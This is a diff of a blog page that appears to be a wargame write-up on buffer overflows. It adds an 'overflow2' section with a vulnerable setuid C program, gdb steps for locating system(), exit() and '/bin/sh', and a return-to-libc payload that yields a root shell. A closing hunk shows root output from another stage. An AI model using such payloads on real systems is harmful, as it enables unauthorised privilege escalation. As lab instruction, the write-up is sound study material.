@@ -15,11 +15,181 @@
 
 <h2 id="overflow1">overflow1</h2>
 
-
+<p>This is too easy. </p>
 
 <h2 id="oveflow2">oveflow2</h2>
 
+<p>The second stage was meant to be about alphanumeric shell code. </p>
 
+
+
+<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-comment">/* Property of USER */</span>
+
+<span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;unistd.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;ctype.h&gt;</span>
+
+
+<span class="hljs-keyword">void</span> lolcat(<span class="hljs-keyword">char</span> *meow, <span class="hljs-keyword">char</span> *arg, <span class="hljs-keyword">char</span> *woof)
+{
+        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">185</span>];
+        <span class="hljs-keyword">int</span> i;
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(meow) &gt; <span class="hljs-number">16</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 1 iz too long!\n"</span>);
+                <span class="hljs-keyword">return</span>;
+        }
+
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
+        {
+                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (arg[i]))
+                {
+                        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 2 iz tainted!\n"</span>);
+                        <span class="hljs-keyword">return</span>;
+                }
+        }
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(woof) &gt; <span class="hljs-number">16</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 3 iz too long!\n"</span>);
+                <span class="hljs-keyword">return</span>;
+        }
+
+        <span class="hljs-built_in">sprintf</span> (buf, <span class="hljs-string">"HAI HACKER. U SAYS %s%s%s"</span>, meow, arg, woof);
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"U WRAITES %d BAITES\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
+
+        <span class="hljs-keyword">return</span>;
+}
+
+
+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)
+{
+        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"I can haz three arguments?\n"</span>);
+                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
+        }
+        <span class="hljs-comment">/* Clear all environment variables so people don't sneak nasty things into my memory &gt;:( */</span>
+        <span class="hljs-keyword">while</span> (environ[i])
+        {
+                <span class="hljs-built_in">memset</span> (environ[i], <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
+                i++;
+        }
+        clearenv(); <span class="hljs-comment">/* Flush out the environment table */</span>
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">0</span>]); i++)
+        {
+                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (argv[<span class="hljs-number">0</span>][i]) &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-_/"</span>,argv[<span class="hljs-number">0</span>][i]) == NULL)
+                        <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
+        }
+
+        lolcat (argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);
+
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"KTHXBYE.\n"</span>);
+
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+</code></pre>
+
+<p>The program takes three parameters, and uses three methods to ensure certain conditions. </p>
+
+<ul>
+<li>The first argument can be in any form as long as it doesn’t exceed 16 char</li>
+<li>The second argument has to be alphanumeric, meaning it can only includes [A-Z][a-z][0-9]</li>
+<li>The third argument can be in any form as long as it doesn’t exceed 16 char</li>
+</ul>
+
+<p>So apparently, we are supposed to work with alphanumeric shellcode, with the help of tools like metasploit. However, I will introduce a detour to work around the alphanumeric restraint (cause I am not an expert in that and there is a much better tutorial <a href="http://note.heron.me/2014/11/alphanumeric-shellcode-of-execbinsh.html?m=1">Here</a>  ).</p>
+
+<p>The third argument is where we will actually overflow the buffer and rewrite the return address. 16 byte can be put to great use if we organize it carefully. The basic idea is a return-to-libc exploit: we want to jump to the execution of <code>system("/bin/sh")</code> somewhere in the memory. So we will need three addresses:</p>
+
+<ul>
+<li>The address of <code>system()</code></li>
+<li>The address of string <code>/bin/sh</code></li>
+<li>The address of <code>exit()</code> so we can exit the program cleanly <br>
+Why is this exploit available? Recall the structure of the memory stack when the function returned. It is organized as:</li>
+</ul>
+
+
+
+<pre class="prettyprint"><code class=" hljs asciidoc">
+<span class="hljs-header">|                | 
++================+</span>
+|                |  
+<span class="hljs-header">| arguments      |
++================+</span>
+| next return    |
+|   address      |
+<span class="hljs-code">+================+</span>   
+<span class="hljs-header">| return address | &lt;- eip
++================+</span>
+<span class="hljs-header">| old ebp        | &lt;- ebp
++================+</span>
+|                |</code></pre>
+
+<p>We can easily push the address of <code>system()</code> and <code>exit()</code> to the stack, and the string <code>/bin/sh</code> as an argument, and these three addresses can be easily found inside <code>gdb</code>, you gotta know how to use this powerful debugger.</p>
+
+<pre class="prettyprint"><code class=" hljs ruby">user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/c0re</span><span class="hljs-variable">$ </span>gdb overflow2
+
+(gdb) unset env <span class="hljs-constant">LINES</span>
+(gdb) unset env <span class="hljs-constant">COLUMNS</span>
+(gdb) b lolcat
+<span class="hljs-constant">Breakpoint</span> <span class="hljs-number">1</span> at <span class="hljs-number">0x80485e4</span></code></pre>
+
+<p>Remember the variables on the memory stack is not loaded until you run the program, so we can first just feed some random input to the program to extract our address.</p>
+
+
+
+<pre class="prettyprint"><code class=" hljs mel">(gdb) run <span class="hljs-variable">$(</span><span class="hljs-keyword">python</span> -c <span class="hljs-string">'print "\x90 "*3'</span>)
+Starting program: /c0re/attackme2 <span class="hljs-variable">$(</span><span class="hljs-keyword">python</span> -c <span class="hljs-string">'print "\x90 "*3'</span>)
+Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080485e4</span> <span class="hljs-keyword">in</span> lolcat ()</code></pre>
+
+<p>We already know the two system call <code>system()</code> and <code>exit()</code> must be somewhere on the stack stored with variable names <code>system</code> and <code>exit</code>, we can just do:</p>
+
+
+
+<pre class="prettyprint"><code class=" hljs perl">(gdb) p <span class="hljs-keyword">system</span>
+<span class="hljs-variable">$1</span> = {&lt;text variable, <span class="hljs-keyword">no</span> debug info&gt;} <span class="hljs-number">0xf7e4c840</span> &lt;<span class="hljs-keyword">system</span>&gt;
+(gdb) p <span class="hljs-keyword">exit</span>
+<span class="hljs-variable">$2</span> = {&lt;text variable, <span class="hljs-keyword">no</span> debug info&gt;} <span class="hljs-number">0xf7e407f0</span> &lt;<span class="hljs-keyword">exit</span>&gt;
+</code></pre>
+
+<p>How about the address of the string <code>"/bin/sh"</code>? If the environment variable isn’t cleared out buffer overflow we can make use of it. However, this smart programmer somehow wrote a program to defend against injection through environment table but not a buffer overflow. OK. Let’s just do a search in <code>gdb</code></p>
+
+
+
+<pre class="prettyprint"><code class=" hljs livecodeserver">(gdb) find &amp;<span class="hljs-keyword">system</span>,+<span class="hljs-number">9999999</span>,<span class="hljs-string">"/bin/sh"</span>
+<span class="hljs-number">0xf7f6ed48</span>
+warning: Unable <span class="hljs-built_in">to</span> access <span class="hljs-number">16000</span> <span class="hljs-keyword">bytes</span> <span class="hljs-operator">of</span> target memory <span class="hljs-keyword">at</span> <span class="hljs-number">0xf7fc8ad0</span>, halting search.
+<span class="hljs-number">1</span> pattern found.</code></pre>
+
+<p>LOL that was easy. Now we have the three addresses. </p>
+
+
+
+<pre class="prettyprint"><code class=" hljs perl"> <span class="hljs-number">1</span>. <span class="hljs-keyword">system</span>():<span class="hljs-number">0xf7e4c840</span>
+ <span class="hljs-number">2</span>. <span class="hljs-keyword">exit</span>():<span class="hljs-number">0xf7e407f0</span> 
+ <span class="hljs-number">3</span>. <span class="hljs-string">"/bin/sh"</span>:<span class="hljs-number">0xf7f6ed48</span></code></pre>
+
+<p>Time to craft the payload. <br>
+ <code>$(python -c 'print "\x90"*9+" "+"G"*165+" \x40\xc8\xe4\xf7\xf0\x07\xe4\xf7 <br>
+ \x48\xed\xf6\xf7"')</code> <br>
+Note the space between three groups of arguments, and <code>G</code> is the alphanumeric <code>nop</code>, well actually you don’t really care about it anyway.  <br>
+Let’s run it. <br>
+<code>user@host:/c0re$ /c0re/attackme2 $(python -c 'print "\x90"*9+" "+"G"*165+" \x40\xc8\xe4\xf7\xf0\x07\xe4\xf7\x48\xed\xf6\xf7"')</code></p>
+
+
+
+<pre class="prettyprint"><code class=" hljs tex">user@host:/c0re<span class="hljs-formula">$ /c0re/attackme2 $</span>(python -c 'print "<span class="hljs-command">\x</span>90"*9+" "+"G"*165+" <span class="hljs-command">\x</span>40<span class="hljs-command">\xc</span>8<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\xf</span>0<span class="hljs-command">\x</span>07<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>48<span class="hljs-command">\xed</span><span class="hljs-command">\xf</span>6<span class="hljs-command">\xf</span>7"')
+U WRAITES 205 BAITES
+<span class="hljs-special">#</span> whoami
+root
+</code></pre>
+
+<p>Easy right?</p>
 
 <h2 id="overflow3">overflow3</h2>
 
@@ -286,7 +456,5 @@ Now everything is set up: it is divisible by 256, it redirect the return to our 
 uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030</span>(user) groups=<span class="hljs-number">1030</span>(user)</code></pre>
 
 <p>Great! We compromise the program and gain root access in shell! </p>
-
-
 
 <h2 id="overflow4">overflow4</h2>
